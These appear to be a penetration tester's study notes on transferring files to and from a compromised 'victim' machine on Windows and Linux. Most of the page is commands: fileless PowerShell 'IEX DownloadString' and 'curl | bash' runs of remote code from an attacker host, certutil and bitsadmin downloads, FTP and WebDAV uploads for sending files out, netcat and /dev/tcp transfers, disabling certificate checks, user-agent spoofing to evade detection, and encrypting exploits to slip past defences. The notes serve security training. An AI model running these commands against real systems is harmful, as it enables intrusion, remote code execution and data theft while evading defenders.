---
title: Notes | Transfer Files
author: Zeropio
date: 2022-07-13
categories: [Notes, System]
tags: []
permalink: /notes/system/transfer-files
---

# Windows 

## PowerShell Base64 Encode & Decode 

Let's:
- Check hash
- Encode 
- Transfer

```console
zero@pio$ md5sum exploit
zero@pio$ cat exploit | base64 -w 0; echo

[string]
```

In the victim:
```console
PS C:\victim> [IO.File]::WriteAllBytes("C:\Users\Public\exploit", [Convert]::FromBase64String("[string]"))
```

To check the hash:
```console
PS C:\victim> Get-FileHash C:\Users\Public\exploit -Algorithm md5
```

> Windows CMD has a maximun lenght of 8191 characters
{: .prompt-warning }

## PowerShell Web Downloads 

With the **System.Net.WebClient** class we can download contents from http. This are the methods aviable

| **Method**   | **Description**    |
|--------------- | --------------- |
| `OpenRead` |	Returns the data from a resource as a Stream. |
| `OpenReadAsync` |	Returns the data from a resource without blocking the calling thread. |
| `DownloadData` |	Downloads data from a resource and returns a Byte array. |
| `DownloadDataAsync` |	Downloads data from a resource and returns a Byte array without blocking the calling thread. |
| `DownloadFile` |	Downloads data from a resource to a local file. |
| `DownloadFileAsync` |	Downloads data from a resource to a local file without blocking the calling thread. |
| `DownloadString` |	Downloads a String from a resource and returns a String. |
| `DownloadStringAsync` |	Downloads a String from a resource without blocking the calling thread. |

- File download 

```console
PS C:\victim> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
ps C:\victim> (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

- Fileless method 

```console
PS C:\victim> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
PS C:\victim> (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
```

- Invoke-WebRequest

```console
PS C:\victim> Invoke-WebRequest  <Target File URL> -OutFile <Output File Name>
```

More examples [here](https://gist.githubusercontent.com/HarmJ0y/bb48307ffa663256e239/raw/f1e0d1877d1b9dd6b3fc8bae18ff6cec6ea6eaa8/DownloadCradles.ps1).

## Troubleshooting

- Internet Explorer first-launch configuration has not been completed 

```console
PS C:\victim> Invoke-WebRequest <Target File URL> | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.

PS C:\victim> Invoke-WebRequest <Target File URL> -UseBasicParsing | IEX
```

- Certificate not trusted

```console
PS C:\victim> IEX(New-Object Net.WebClient).DownloadString('<Target File URL')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."

PS C:\victim> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB downloads 

First create the server:
```console
zero@pio$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```

Then copy it:
```console
PS C:\victim> copy \\<your ip>\share\<exploit>

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

If this happen we need to create it with credentials.
```console
zero@pio$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password pass
```

And then mount it:
```console
PS C:\victim> net use n: \\<your ip>\share /user:test pass
```

## FTP downloads 

With Python3 we can start a FTP server:
```console
zero@pio$ sudo pip3 install pyftpdlib
zero@pio$ sudo python3 -m pyftpdlib --port 2x1table
```

In the victim:
```console
PS C:\victim> (New-Object Net.WebClient).DownloadFile('ftp://<your ip>/<exploit>', '<ouput file>')
```

If we want to upload:
```console
PS C:\victim> (New-Object Net.WebClient).UploadFile('ftp://<your ip>/<file name>', '<path to file>')
```

## WebDav Server 

To start one:
```console
zero@pio$ sudo pip install wsgidav cheroot
zero@pio$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

Then we can connect:
```console
C:\victim> dir \\<your ip>\DavWWWRoot
```

For uploading files:
```console
C:\victim> copy <path to file> \\<your ip>\DavWWWRoot\
C:\victim> copy <path to file> \\<your ip>\sharefolder\
```

## Bitsadmin 

- Download 

```console
PS C:\victim> bitsadmin /transfer n http://<ip>/<target file> C:\Temp\<output file>
PS C:\victim> Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ip>/<file>" -Destination "C:\Temp\<output file>"
```

- Upload 

```console
PS C:\victim> Start-BitsTransfer "C:\Temp\<file>" -Destination "http://<ip>/<path>/<output file>" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential <credentials>\svc-sql
```

## Certutil 

```console
C:\victim> certutil.exe -verifyctl -split -f http://<ip>/<file>
```

## Evading detection 

We can change our **User Agent** to evade detection. First list all the aviable:
```console
PS C:\victim> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

Using **Chrome User Agent**:
```console
PS C:\victim> Invoke-WebRequest http://<ip>file>/ -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "<path to output file>"
```

---

# Linux

## base64

If the machine has a firewall that prevent this the file transfer we can encode it:
```console
zero@pio$ base64 shell -w 0
  f0VM.. <SNIP> ...mDwU
```

And in the victim:
```console
victim@machine$ echo f0VM... <SNIP> ...mDwU | base64 -d > shell
```

## Wget and cURL

Download our files:
```console
victim@machine$ wget http://<ip>:<port>/exploit.sh 
victim@machine$ curl http://<ip>:<port>/exploit.sh -o exploit.sh 
```

## Fileless 

```console
victim@machine$ curl http://<ip>/<exploit>/ | bash
victim@machine$ wget -q0- http://<ip>/<exploit>/ | python3
```

## Bash 

```console
victim@machine$ exec 3<>/dev/tcp/<ip>/<port>
victim@machine$ echo -e "GET /<exploit> HTTP/1.1\n\n">&3
victim@machine$ cat <&3
```

> Version 2.04 or greater
{: .prompt-info }

## SSH 

First enable it:
```console
zero@pio$ sudo systemctl enable ssh 
zero@pio$ sudo systemctl start ssh 
zero@pio$ netstat -lnpt 

zero@pio$ scp <file> victim@<ip>:/tmp/<file> 
```

> You can create a temporary user for upload if you don't want to leave your credentials there
{: .prompt-tip}

## Web Servers

We can create a wide variety of web servers for download and upload files: 

- python3 

```console
zero@pio$ sudo python3 -m http.server <port>

zero@pio$ sudo python3 -m uploadserver <port>
zero@pio$ python3 -c 'import requests;requests.post("<python upload server>",files={"files":open("<file to upload>","rb")})'
```


- python2.7

```console
zero@pio$ sudo python2.7 -m SimpleHTTPServer <port>
```

- php

```console
zero@pio$ sudo php -S 0.0.0.0:<port>
```

- ruby

```console
zero@pio$ sudo ruby -run -ehttpd . -p<port>
```

--- 

# Code 

## Python 

- python2 

```console
zero@pio$ python2.7 -c 'import urllib;urllib.urlretrieve ("<target url file>", "<output file>")'
```

- python3 

```console
zero@pio$ python3 -c 'import urllib.request;urllib.request.urlretrieve("<target url file>", "<output file>")'
```

## PHP 

- File\_get\_contents()

```console
zero@pio$ php -r '$file = file_get_contents("<target url file>"); file_put_contents("<output file>",$file);'
```

- Fopen() 

```console
zero@pio$ php -r 'const BUFFER = 1024; $fremote = 
fopen("<tartget url file>", "rb"); $flocal = fopen("<output file>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

- Bash pipe 

```console
zero@pio$ php -r '$lines = @file("<target url file>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby 

```console
zero@pio$ ruby -e 'require "net/http"; File.write("<output file>", Net::HTTP.get(URI.parse("<target url file>")))'
```

## Perl 

```console
zero@pio$ perl -e 'use LWP::Simple; getstore("<target url file>", "<output file>");'
```

## JavaScript 

We can simulate a `wget` command in Windows with the following file:
```JavaScript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

And then:
```console
C:\victim> cscript.exe /nologo wget.js <target url file> <output file>
```

## VBScript

The same can be applied with VBScript (Microsoft Visual Basic Scripting Edition):
```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```console
C:\victim> cscript.exe /nologo wget.vbs <target url file> <output file>
```

---

# Other 

## Netcat 

Creating the file in the target:
```console
victim@machine$ nc -l -p <port> > exploit.exe
```

Uploading:
```console
zero@pio$ wget -q <target url file>
zero@pio$ nc -q 0 <target ip> <port> < exploit.exe
```

Also we can do the opposite:
```console
zero@pio$ sudo nc -l -p <port> -q 0 < exploit.exe
victim@machine$ nc <your ip> <port> > exploit.exe
```

---

# Protected Files 

Sometimes the system could be protected agaisnt this scripts. We can encrypted and decrypted it to work.

## Windows

For example, [this](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) script will encrypt our exploit. The usage is:
```console
PS C:\victim> Import-Module .\Invoke-AESEncryption.ps1
PS C:\victim> Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\<file>
```

## Linux 

- openssl 

```console
zero@pio$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in <file> -out <output file>
```
